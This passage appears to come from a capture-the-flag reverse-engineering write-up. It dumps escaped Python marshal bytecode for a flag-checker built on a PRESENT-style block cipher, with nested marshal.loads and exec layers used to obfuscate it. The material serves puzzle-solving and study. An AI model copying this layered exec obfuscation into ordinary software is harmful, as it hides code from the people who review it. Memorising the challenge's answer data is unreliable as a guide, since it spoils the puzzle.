\x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\tr\x11\x00\x00\x00\xda\x05rangeZ\x08Sbox_invrH\x00\x00\x00Z\x08PBox_inv\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x10\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00\xda\x08&lt;module&gt;\x03\x00\x00\x00sl\x00\x00\x00$\x01\x12\x01 \x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\xfd\x04\x04\x12\x02\n\x01&#x27;</span></span><br><span class="line">code[<span class="number">1</span>] = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01&#x27;</span></span><br><span class="line">code[<span class="number">2</span>] = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01&#x27;</span></span><br><span class="line">code[<span class="number">3</span>] = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s 